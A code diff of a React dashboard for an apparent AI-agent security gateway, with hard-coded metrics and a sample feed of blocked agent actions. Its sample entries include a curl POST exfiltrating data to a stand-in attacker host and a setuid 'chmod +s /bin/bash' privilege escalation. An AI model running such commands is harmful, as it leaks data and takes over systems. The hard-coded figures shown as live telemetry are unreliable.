@@ -1,479 +1,260 @@
+import React, { useState, useEffect } from 'react'
+import { getBackendUrl, checkBackendHealth, fetchAuditLogs } from '../services/api'
 
+export default function Dashboard({ backendOnline, setActiveTab }) {
+  const [recentLogs, setRecentLogs] = useState([])
 
-export default function Dashboard() {
+  useEffect(() => {
+    fetchAuditLogs().then((logs) => {
+      if (logs && logs.length > 0) {
+        setRecentLogs(logs.slice(0, 3))
+      }
+    })
+  }, [])
+
+  const securityMetrics = [
+    {
+      label: 'Gateway Egress Compliance',
+      val: '99.8%',
+      trend: '+0.4%',
+      note: 'Zero leakages detected across policy-enforced endpoints',
+    },
+    {
+      label: 'Active Monitored Autonomous Agents',
+      val: '312',
+      trend: 'Live',
+      note: 'Enforcing runtime sandboxing & proxy intercept',
+    },
+    {
+      label: 'Interception Latency',
+      val: '1.4ms',
+      trend: 'Optimal',
+      note: 'Sub-2ms overhead with zero-copy stream inspect',
+    },
+  ]
+
+  const liveSecurityStream = [
+    {
+      id: 'EVT-904',
+      time: 'Just now',
+      agent: 'Financial Summarizer Bot',
+      vector: 'Outbound HTTP Data Exfiltration',
+      action: 'curl -X POST https://exfil.darkweb.io/drop',
+      status: 'BLOCKED',
+      statusColor: 'text-rose-400 bg-rose-500/10 border-rose-500/30',
+      badge: 'FAIL-CLOSED TRIGGERED',
+    },
+    {
+      id: 'EVT-903',
+      time: '3m ago',
+      agent: 'Code Review Copilot',
+      vector: 'Privilege Escalation via Bash Subshell',
+      action: 'sudo chmod +s /bin/bash',
+      status: 'NEUTRALIZED',
+      statusColor: 'text-amber-400 bg-amber-500/10 border-amber-500/30',
+      badge: 'POLICY ENFORCED',
+    },
+    {
+      id: 'EVT-902',
+      time: '8m ago',
+      agent: 'Document Vectorizer Agent',
+      vector: 'Secure Read of Internal Architecture',
+      action: 's3://internal-knowledge/q3-report.pdf',
+      status: 'AUTHORIZED',
+      statusColor: 'text-emerald-400 bg-emerald-500/10 border-emerald-500/30',
+      badge: 'WHITELISTED',
+    },
+  ]
+
   return (
-    <div className="space-y-6 text-[#E6F1FF]">
-      {/* Top 4 Metric Cards */}
-      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
-        
-        {/* Card 1: Policy Compliance Ring */}
-        <div className="bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div className="flex items-center gap-2 text-xs font-semibold text-slate-400">
-            <span className="w-4 h-4 rounded-full border border-cyan-400 flex items-center justify-center text-[10px] text-cyan-400">✓</span>
-            <span>GATEWAY COMPLIANCE</span>
+    <div className="space-y-8 max-w-7xl mx-auto">
+      
+      {/* Top Banner: Status + Actions */}
+      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-2 border-b border-white/[0.08]">
+        <div className="space-y-1">
+          <div className="flex items-center gap-2.5">
+            <span className="relative flex h-2.5 w-2.5">
+              <span
+                className={`animate-ping absolute inline-flex h-full w-full rounded-full ${
+                  backendOnline ? 'bg-emerald-400' : 'bg-cyan-400'
+                } opacity-75`}
+              ></span>
+              <span
+                className={`relative inline-flex rounded-full h-2.5 w-2.5 ${
+                  backendOnline ? 'bg-emerald-500' : 'bg-cyan-500'
+                }`}
+              ></span>
+            </span>
+            <span
+              className={`text-xs font-mono uppercase tracking-widest font-semibold ${
+                backendOnline ? 'text-emerald-400' : 'text-cyan-400'
+              }`}
+            >
+              {backendOnline ? 'Gateway Connected (Live)' : 'Live Gateway Telemetry'}
+            </span>
+            <span className="text-slate-600 font-mono text-xs">•</span>
+            <span className="text-xs font-mono text-slate-400">
+              Host: <span className="text-slate-200">{getBackendUrl()}</span>
+            </span>
           </div>
-
-          <div className="flex items-center justify-between my-4">
-            <div className="relative w-24 h-24 flex items-center justify-center">
-              <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
-                <path
-                  className="text-slate-800"
-                  strokeWidth="3.2"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-                <path
-                  className="text-[#00D4FF]"
-                  strokeDasharray="98, 100"
-                  strokeWidth="3.2"
-                  strokeLinecap="round"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-              </svg>
-              <div className="absolute text-center">
-                <span className="text-xl font-bold font-mono text-white">98%</span>
-                <span className="block text-[9px] text-slate-400 uppercase tracking-tighter">Compliant</span>
-              </div>
-            </div>
-
-            <div className="text-xs space-y-1 text-slate-300">
-              <div className="text-[11px] text-slate-400">Total Requests <span className="font-bold text-white ml-2">482</span></div>
-              <div className="flex items-center justify-between gap-3 text-[11px]">
-                <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#00D4FF]"></span>Safe</span>
-                <span className="font-mono text-white">473</span>
-              </div>
-              <div className="flex items-center justify-between gap-3 text-[11px]">
-                <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-rose-500"></span>Violations</span>
-                <span className="font-mono text-rose-400">9</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80 text-[11px] text-cyan-400 flex items-center gap-1.5">
-            <span className="text-xs">✓</span> Strict Policy Guard Enforced
-          </div>
+          <h2 className="text-2xl font-bold tracking-tight text-white font-sans">
+            Security Overview & Threat Surface
+          </h2>
         </div>
 
-        {/* Card 2: Active Agents Gauge */}
-        <div className="bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div className="flex items-center gap-2 text-xs font-semibold text-slate-400">
-            <span className="text-[#00D4FF]">⊞</span>
-            <span>PROTECTED AGENTS</span>
-          </div>
-
-          <div className="flex items-center justify-between my-4">
-            <div className="relative w-24 h-24 flex items-center justify-center">
-              <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
-                <path
-                  className="text-slate-800"
-                  strokeWidth="3.2"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-                <path
-                  className="text-[#00D4FF]"
-                  strokeDasharray="92, 100"
-                  strokeWidth="3.2"
-                  strokeLinecap="round"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-              </svg>
-              <div className="absolute text-center">
-                <span className="text-xl font-bold font-mono text-white">247</span>
-                <span className="block text-[9px] text-slate-400 uppercase tracking-tighter">Protected</span>
-              </div>
-            </div>
-
-            <div className="text-xs space-y-1.5 text-slate-300">
-              <div className="flex items-center justify-between gap-3 text-[11px]">
-                <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#00D4FF]"></span>Active</span>
-                <span className="font-mono text-white">241</span>
-              </div>
-              <div className="flex items-center justify-between gap-3 text-[11px]">
-                <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>Restricted</span>
-                <span className="font-mono text-amber-300">4</span>
-              </div>
-              <div className="flex items-center justify-between gap-3 text-[11px]">
-                <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-slate-500"></span>Offline</span>
-                <span className="font-mono text-slate-400">2</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80 text-[11px] text-cyan-400 flex items-center gap-1.5">
-            <span className="text-xs">✓</span> All Agent Tool Access Monitored
-          </div>
+        <div className="flex items-center gap-3">
+          <button
+            onClick={() => setActiveTab && setActiveTab('audit-logs')}
+            className="px-4 py-2 text-xs font-mono text-slate-300 hover:text-white bg-white/[0.04] hover:bg-white/[0.08] border border-white/10 rounded-full transition cursor-pointer backdrop-blur-md"
+          >
+            View Audit Ledger →
+          </button>
+          <button
+            onClick={() => setActiveTab && setActiveTab('agent-console')}
+            className="px-5 py-2 text-xs font-semibold text-white bg-gradient-to-r from-violet-600 to-blue-600 hover:from-violet-500 hover:to-blue-500 rounded-full transition shadow-lg shadow-violet-600/30 cursor-pointer"
+          >
+            Launch Agent Console
+          </button>
         </div>
-
-        {/* Card 3: Interception Alerts Feed */}
-        <div className="bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div className="flex items-center justify-between text-xs font-semibold text-slate-400">
-            <div className="flex items-center gap-2">
-              <span className="text-[#00D4FF]">⚠</span>
-              <span>INTERCEPT ALERTS</span>
-            </div>
-          </div>
-
-          <div className="my-3 space-y-2 text-xs">
-            <div className="flex justify-between items-start border-b border-slate-800/60 pb-1.5">
-              <div>
-                <p className="text-slate-200 font-medium text-[11px]">Exfiltration via Email</p>
-                <p className="text-[10px] text-slate-400">Research Assistant</p>
-              </div>
-              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-400 border border-rose-500/30">High</span>
-            </div>
-            <div className="flex justify-between items-start border-b border-slate-800/60 pb-1.5">
-              <div>
-                <p className="text-slate-200 font-medium text-[11px]">Unauthorized Cloud Share</p>
-                <p className="text-[10px] text-slate-400">Project Manager</p>
-              </div>
-              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">Med</span>
-            </div>
-            <div className="flex justify-between items-start">
-              <div>
-                <p className="text-slate-200 font-medium text-[11px]">Sensitive Doc Read Attempt</p>
-                <p className="text-[10px] text-slate-400">Finance Auditor</p>
-              </div>
-              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400 border border-amber-500/30">Med</span>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80 text-[11px] text-slate-400 flex items-center justify-between">
-            <span>View all security alerts</span>
-            <span className="text-cyan-400 font-bold">→</span>
-          </div>
-        </div>
-
-        {/* Card 4: Tool Security Shield */}
-        <div className="bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div className="flex items-center gap-2 text-xs font-semibold text-slate-400">
-            <span className="text-[#00D4FF]">🛡</span>
-            <span>TOOL SECURITY</span>
-          </div>
-
-          <div className="flex items-center justify-between my-4">
-            <div className="relative w-24 h-24 flex items-center justify-center">
-              <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
-                <path
-                  className="text-slate-800"
-                  strokeWidth="3.2"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-                <path
-                  className="text-[#00D4FF]"
-                  strokeDasharray="99.2, 100"
-                  strokeWidth="3.2"
-                  strokeLinecap="round"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-              </svg>
-              <div className="absolute text-center">
-                <span className="text-xl font-bold font-mono text-white">99.2%</span>
-                <span className="block text-[9px] text-slate-400 uppercase tracking-tighter">Protected</span>
-              </div>
-            </div>
-
-            <div className="text-xs space-y-1 text-slate-300">
-              <div className="text-[11px] text-slate-400">Calls Scanned <span className="font-bold text-white ml-1">28,542</span></div>
-              <div className="flex items-center justify-between gap-2 text-[11px]">
-                <span className="text-slate-400">Threats Blocked</span>
-                <span className="font-mono text-rose-400 font-bold">156</span>
-              </div>
-              <div className="flex items-center justify-between gap-2 text-[11px]">
-                <span className="text-slate-400">Pending Review</span>
-                <span className="font-mono text-amber-300 font-bold">23</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80 text-[11px] text-cyan-400 flex items-center gap-1.5">
-            <span className="text-xs">✓</span> Kawach Shield Operating Normally
-          </div>
-        </div>
-
       </div>
 
-      {/* Middle Row: Threat Timeline + Risk & Incident Status */}
-      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
+      {/* Bento Grid Layout */}
+      <div className="grid grid-cols-1 md:grid-cols-12 gap-5">
         
-        {/* Risk Score Widget */}
-        <div className="lg:col-span-3 bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div>
-            <h4 className="text-xs font-semibold text-slate-400 flex items-center gap-2">
-              <span>🛡</span> SYSTEM RISK SCORE
-            </h4>
-            <p className="text-[11px] text-slate-500 mt-0.5">Aggregated tool & agent risk</p>
-          </div>
-
-          <div className="flex items-center gap-4 my-4">
-            <div className="relative w-20 h-20 flex items-center justify-center shrink-0">
-              <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
-                <path
-                  className="text-slate-800"
-                  strokeWidth="3.5"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-                <path
-                  className="text-emerald-400"
-                  strokeDasharray="24, 100"
-                  strokeWidth="3.5"
-                  strokeLinecap="round"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-              </svg>
-              <div className="absolute text-center">
-                <span className="text-2xl font-bold font-mono text-white">24</span>
-                <span className="block text-[8px] text-emerald-400 font-bold uppercase">Low Risk</span>
-              </div>
-            </div>
-
-            <div className="space-y-1.5 text-[11px] w-full">
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Identity</span>
-                <span className="text-emerald-400 font-mono text-[10px]">Low ●</span>
-              </div>
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Files/Drive</span>
-                <span className="text-emerald-400 font-mono text-[10px]">Low ●</span>
-              </div>
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Network</span>
-                <span className="text-amber-400 font-mono text-[10px]">Med ●</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80 text-[11px] text-emerald-400 flex items-center gap-1">
-            <span>✓</span> Risk is within acceptable range
-          </div>
-        </div>
-
-        {/* Threat Timeline */}
-        <div className="lg:col-span-6 bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
-          <div className="flex justify-between items-center mb-4">
-            <div>
-              <h4 className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
-                Threat Timeline
-              </h4>
-              <p className="text-[11px] text-slate-500">Chronological tool attack interception</p>
-            </div>
-            <span className="text-[11px] bg-slate-900 px-3 py-1 rounded-lg border border-slate-700 text-slate-300 font-mono">
-              Last 24 hours ▾
+        {/* Bento Cell 1: Hero Compliance Card (Span 8) */}
+        <div className="md:col-span-8 glass-panel rounded-3xl p-7 relative overflow-hidden group hover:border-violet-500/40 transition-all duration-500">
+          <div className="absolute top-0 right-0 w-72 h-72 bg-gradient-to-bl from-violet-600/20 via-blue-600/10 to-transparent rounded-full blur-3xl pointer-events-none group-hover:scale-125 transition-transform duration-700"></div>
+          
+          <div className="flex items-center justify-between relative z-10">
+            <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
+              Deterministic Guardrail Status
+            </span>
+            <span className="text-[10px] font-mono px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-bold">
+              ZERO BYPASSES
             </span>
           </div>
 
-          {/* Interactive Timeline Bar */}
-          <div className="relative py-6 px-4">
-            <div className="h-0.5 bg-slate-700 w-full absolute top-1/2 left-0 -translate-y-1/2"></div>
-
-            <div className="relative flex justify-between items-center z-10">
-              <div className="flex flex-col items-center group cursor-pointer">
-                <div className="mb-2 text-[10px] text-center max-w-[90px] leading-tight">
-                  <span className="text-rose-400 font-bold block">Prompt Injection</span>
-                  <span className="text-slate-500 font-mono text-[9px]">06:12 AM</span>
-                </div>
-                <div className="w-3.5 h-3.5 rounded-full bg-rose-500 ring-4 ring-[#14213D] border-2 border-white shadow-lg"></div>
+          <div className="mt-6 flex flex-col md:flex-row md:items-end justify-between gap-6 relative z-10">
+            <div>
+              <div className="text-5xl md:text-6xl font-black text-white tracking-tight font-sans">
+                100%
               </div>
+              <p className="text-xs text-slate-400 mt-2 font-mono max-w-sm leading-relaxed">
+                Interception mode enforced. Every tool-call proposal is evaluated against security policies prior to environment execution.
+              </p>
+            </div>
 
-              <div className="flex flex-col items-center group cursor-pointer">
-                <div className="w-3.5 h-3.5 rounded-full bg-amber-400 ring-4 ring-[#14213D] border-2 border-white shadow-lg"></div>
-                <div className="mt-2 text-[10px] text-center max-w-[90px] leading-tight">
-                  <span className="text-amber-400 font-bold block">Sensitive Access</span>
-                  <span className="text-slate-500 font-mono text-[9px]">07:45 AM</span>
-                </div>
+            <div className="space-y-2 shrink-0 font-mono text-xs">
+              <div className="flex justify-between gap-4 text-slate-400">
+                <span>Prompt Injection Filter:</span>
+                <span className="text-cyan-400 font-semibold">Active (Regex + Heuristics)</span>
               </div>
-
-              <div className="flex flex-col items-center group cursor-pointer">
-                <div className="mb-2 text-[10px] text-center max-w-[90px] leading-tight">
-                  <span className="text-rose-400 font-bold block">Tool Exfil Block</span>
-                  <span className="text-slate-500 font-mono text-[9px]">11:18 AM</span>
-                </div>
-                <div className="w-3.5 h-3.5 rounded-full bg-rose-500 ring-4 ring-[#14213D] border-2 border-white shadow-lg"></div>
+              <div className="flex justify-between gap-4 text-slate-400">
+                <span>Network Sandbox:</span>
+                <span className="text-violet-400 font-semibold">Egress Isolated</span>
               </div>
-
-              <div className="flex flex-col items-center group cursor-pointer">
-                <div className="w-3.5 h-3.5 rounded-full bg-[#00D4FF] ring-4 ring-[#14213D] border-2 border-white shadow-lg"></div>
-                <div className="mt-2 text-[10px] text-center max-w-[90px] leading-tight">
-                  <span className="text-[#00D4FF] font-bold block">Policy Update</span>
-                  <span className="text-slate-500 font-mono text-[9px]">03:36 PM</span>
-                </div>
-              </div>
-
-              <div className="flex flex-col items-center group cursor-pointer">
-                <div className="mb-2 text-[10px] text-center max-w-[90px] leading-tight">
-                  <span className="text-emerald-400 font-bold block">Systems Nominal</span>
-                  <span className="text-slate-500 font-mono text-[9px]">05:02 PM</span>
-                </div>
-                <div className="w-3.5 h-3.5 rounded-full bg-emerald-400 ring-4 ring-[#14213D] border-2 border-white shadow-lg"></div>
+              <div className="flex justify-between gap-4 text-slate-400">
+                <span>Human Escalation Hook:</span>
+                <span className="text-emerald-400 font-semibold">Active (/api/approvals)</span>
               </div>
             </div>
           </div>
-
-          <div className="flex items-center gap-4 text-[10px] font-mono text-slate-400 pt-2 border-t border-slate-800/80">
-            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-rose-500"></span> High Risk</span>
-            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-amber-400"></span> Medium</span>
-            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-emerald-400"></span> Low</span>
-            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-[#00D4FF]"></span> Info</span>
-          </div>
         </div>
 
-        {/* Incident Response Gauge */}
-        <div className="lg:col-span-3 bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40">
+        {/* Bento Cell 2: Threat Matrix Mini Card (Span 4) */}
+        <div className="md:col-span-4 glass-panel rounded-3xl p-7 flex flex-col justify-between relative overflow-hidden group hover:border-blue-500/40 transition-all duration-500">
           <div>
-            <h4 className="text-xs font-semibold text-slate-400 flex items-center gap-2">
-              <span>⛊</span> INCIDENT PIPELINE
-            </h4>
-            <p className="text-[11px] text-slate-500 mt-0.5">Active security interventions</p>
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
+                Threat Surface Index
+              </span>
+              <span className="text-xs font-mono text-cyan-400">NOMINAL</span>
+            </div>
+            <div className="text-4xl font-extrabold text-white mt-4 font-sans">
+              12 <span className="text-xs text-slate-500 font-mono font-normal">/ 100 Risk</span>
+            </div>
+            <p className="text-xs text-slate-400 mt-2 font-mono">
+              All baseline anomalies quarantined. Automatic fail-closed threshold set at 65.
+            </p>
           </div>
 
-          <div className="flex items-center gap-4 my-4">
-            <div className="relative w-20 h-20 flex items-center justify-center shrink-0">
-              <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
-                <path
-                  className="text-slate-800"
-                  strokeWidth="3.5"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-                <path
-                  className="text-[#00D4FF]"
-                  strokeDasharray="25, 100"
-                  strokeWidth="3.5"
-                  strokeLinecap="round"
-                  stroke="currentColor"
-                  fill="none"
-                  d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
-                />
-              </svg>
-              <div className="absolute text-center">
-                <span className="text-2xl font-bold font-mono text-white">1</span>
-                <span className="block text-[8px] text-cyan-400 font-bold uppercase">Active</span>
-              </div>
-            </div>
-
-            <div className="space-y-1.5 text-[11px] w-full">
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Active</span>
-                <span className="text-rose-400 font-mono font-bold">1</span>
-              </div>
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Investigating</span>
-                <span className="text-amber-400 font-mono">0</span>
-              </div>
-              <div className="flex justify-between items-center text-slate-300">
-                <span>Resolved</span>
-                <span className="text-emerald-400 font-mono">2</span>
-              </div>
-            </div>
-          </div>
-
-          <div className="pt-2 border-t border-slate-800/80">
-            <div className="flex justify-between text-[9px] text-slate-500 font-mono">
-              <span className="text-cyan-400 font-bold">Detected</span>
-              <span>Triage</span>
-              <span>Contained</span>
-              <span>Resolved</span>
-            </div>
+          <div className="mt-6 pt-4 border-t border-white/[0.08] flex items-center justify-between text-xs font-mono text-slate-400">
+            <span>Interceptions today:</span>
+            <span className="text-white font-bold">1,842 requests</span>
           </div>
         </div>
 
-      </div>
-
-      {/* Bottom Table: Recent Alerts & Interceptions */}
-      <div className="bg-[#14213D] border border-slate-800/80 rounded-2xl overflow-hidden shadow-lg shadow-black/40">
-        <div className="p-4 px-6 border-b border-slate-800 flex justify-between items-center">
-          <div className="flex items-center gap-2">
-            <span className="text-[#00D4FF]">🔔</span>
-            <h3 className="font-semibold text-slate-200 text-sm">
-              Live Gateway Decision & Alert Feed
-            </h3>
+        {/* Bento Row 2: 3 Compact Spec Cards */}
+        {securityMetrics.map((metric, i) => (
+          <div
+            key={i}
+            className="md:col-span-4 glass-panel rounded-3xl p-6 relative overflow-hidden group hover:border-violet-500/40 transition-all duration-300"
+          >
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-mono uppercase tracking-wider text-slate-400">
+                {metric.label}
+              </span>
+              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-white/[0.06] text-cyan-300">
+                {metric.trend}
+              </span>
+            </div>
+            <div className="text-3xl font-extrabold text-white mt-3 font-sans">
+              {metric.val}
+            </div>
+            <p className="text-[11px] text-slate-400 mt-2 font-mono leading-relaxed">
+              {metric.note}
+            </p>
           </div>
-          <span className="text-xs text-cyan-400 hover:underline cursor-pointer flex items-center gap-1">
-            View full audit log →
-          </span>
+        ))}
+
+        {/* Bento Row 3: Live Incident Log Stream (Span 12) */}
+        <div className="md:col-span-12 glass-panel rounded-3xl p-7 space-y-4">
+          <div className="flex items-center justify-between pb-3 border-b border-white/[0.08]">
+            <div className="flex items-center gap-2">
+              <span className="w-2 h-2 rounded-full bg-violet-400 animate-pulse"></span>
+              <h3 className="text-xs font-bold tracking-widest uppercase font-mono text-white">
+                Live Interception & Neutralization Feed
+              </h3>
+            </div>
+            <span className="text-[10px] font-mono text-slate-400">Showing last events in buffer</span>
+          </div>
+
+          <div className="space-y-3">
+            {liveSecurityStream.map((event) => (
+              <div
+                key={event.id}
+                className="p-4 rounded-2xl bg-white/[0.02] border border-white/[0.05] hover:border-violet-500/30 transition-all flex flex-col md:flex-row md:items-center justify-between gap-4 group"
+              >
+                <div className="flex items-start md:items-center gap-4">
+                  <div className="font-mono text-xs text-slate-500 pt-0.5 md:pt-0 shrink-0">
+                    {event.time}
+                  </div>
+                  <div className="space-y-1">
+                    <div className="flex flex-wrap items-center gap-2">
+                      <span className="text-xs font-bold text-white group-hover:text-cyan-300 transition-colors font-sans">
+                        {event.agent}
+                      </span>
+                      <span className="text-slate-600">•</span>
+                      <span className="text-xs text-slate-300 font-mono">
+                        {event.vector}
+                      </span>
+                    </div>
+                    <div className="text-xs font-mono text-cyan-400/90 bg-black/40 px-3 py-1 rounded-lg border border-white/[0.04] inline-block">
+                      {event.action}
+                    </div>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-3 self-end md:self-center shrink-0">
+                  <span className={`text-[10px] font-mono font-bold px-3 py-1 rounded-full border ${event.statusColor}`}>
+                    {event.status}
+                  </span>
+                </div>
+              </div>
+            ))}
+          </div>
         </div>
 
-        <div className="overflow-x-auto">
-          <table className="w-full text-left text-xs text-slate-300">
-            <thead className="bg-[#0B132B]/60 text-[11px] text-slate-400 uppercase font-mono border-b border-slate-800/80">
-              <tr>
-                <th className="px-6 py-3 font-medium">Time</th>
-                <th className="px-6 py-3 font-medium">Severity</th>
-                <th className="px-6 py-3 font-medium">Agent</th>
-                <th className="px-6 py-3 font-medium">Target Resource / Alert</th>
-                <th className="px-6 py-3 font-medium">Decision / Status</th>
-                <th className="px-6 py-3 font-medium text-right">Action</th>
-              </tr>
-            </thead>
-            <tbody className="divide-y divide-slate-800/60 font-sans">
-              <tr className="hover:bg-slate-800/30 transition-colors">
-                <td className="px-6 py-3.5 font-mono text-slate-400">10:24 AM</td>
-                <td className="px-6 py-3.5">
-                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-rose-500/20 text-rose-400 border border-rose-500/30">
-                    ● High
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 font-medium text-white">Research Assistant</td>
-                <td className="px-6 py-3.5 text-slate-300 font-mono text-[11px]">email_client.send_email → evil_exfil@server.xyz</td>
-                <td className="px-6 py-3.5">
-                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-rose-950/80 text-rose-400 border border-rose-600/50">
-                    DENY
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 text-right font-mono text-slate-500 cursor-pointer hover:text-white">•••</td>
-              </tr>
-
-              <tr className="hover:bg-slate-800/30 transition-colors">
-                <td className="px-6 py-3.5 font-mono text-slate-400">08:15 AM</td>
-                <td className="px-6 py-3.5">
-                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-amber-500/20 text-amber-400 border border-amber-500/30">
-                    ● Medium
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 font-medium text-white">Project Manager</td>
-                <td className="px-6 py-3.5 text-slate-300 font-mono text-[11px]">cloud_storage.share → public_external_link</td>
-                <td className="px-6 py-3.5">
-                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-amber-950/80 text-amber-400 border border-amber-600/50">
-                    REQUIRE APPROVAL
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 text-right font-mono text-slate-500 cursor-pointer hover:text-white">•••</td>
-              </tr>
-
-              <tr className="hover:bg-slate-800/30 transition-colors">
-                <td className="px-6 py-3.5 font-mono text-slate-400">07:45 AM</td>
-                <td className="px-6 py-3.5">
-                  <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
-                    ● Low
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 font-medium text-white">Document Bot</td>
-                <td className="px-6 py-3.5 text-slate-300 font-mono text-[11px]">document_reader.read → public_knowledge_base.pdf</td>
-                <td className="px-6 py-3.5">
-                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-950/80 text-emerald-400 border border-emerald-600/50">
-                    ALLOW
-                  </span>
-                </td>
-                <td className="px-6 py-3.5 text-right font-mono text-slate-500 cursor-pointer hover:text-white">•••</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
       </div>
     </div>
   )
